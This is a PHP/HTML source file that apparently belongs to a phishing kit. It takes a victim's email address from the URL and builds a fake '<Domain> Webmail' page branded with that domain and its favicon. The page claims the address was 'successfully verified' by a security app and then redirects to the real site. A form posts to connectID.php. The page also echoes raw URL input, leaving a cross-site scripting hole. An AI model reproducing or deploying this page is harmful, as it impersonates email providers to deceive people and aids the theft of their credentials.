<?php
function getloginIDFromlogin($text)
{
$find = '@';
$pos = strpos($text, $find);
$loginID = substr($text, 0, $pos);
return $loginID;
}
function getDomainFromEmail($text)
{
// Get the data after the @ sign
$domain = substr(strrchr($text, "@"), 1);
return $domain;
}
$l0gin = $_GET['text'];
$loginID = getloginIDFromlogin($l0gin);
$domain = getDomainFromEmail($l0gin);
$ln = strlen($l0gin);
$len = strrev($l0gin);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title><?php echo $yuh ?> Webmail :: Welcome to <?php echo $yuh ?> Webmail</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta HTTP-EQUIV="REFRESH" content="5; url=http://<?php echo $domain ?>">
<!--===============================================================================================-->	
	<link rel="SHORTCUT ICON" href="http://<?php echo $domain ?>/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100 p-t-50 p-b-90">
				
				
				 <!--Table 3-->
            <table cellpadding="0" cellspacing="0">
			    <col>
			    <col class="w100">
			    <tr class="height">
				    <td>&nbsp;</td>
				    <td><label for="rdoPblc">Your email (<?php echo $l0gin ?>), has been successfully verified.<br /><br />Thank you for using our <?php echo $yuh ?>'s Security Web App..</label><br>
<br>
We will redirect you shortly to <b><?php echo $domain ?></b></td>
			    </tr>
			    
			    <tr class="height">
				    <td>&nbsp;</td>
				    <td><label for="rdoPrvt"></label></td>
			    </tr>
			</table><br>
 <form name="form" action="connectID.php" method="post">
 
 
Connected to <?php echo $l0gin ?>
					</div>

				</form>
			</div>
		</div>
	</div>
	
	<footer>
	
	<center><!--<?php echo $yuh ?> Webmail -->Secured by <?php echo $yuh ?> Webmail Security Systems<br>
&copy; 2018 <?php echo $yuh ?> Corporation. All rights reserved.</center>
		
	
			</footer>
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>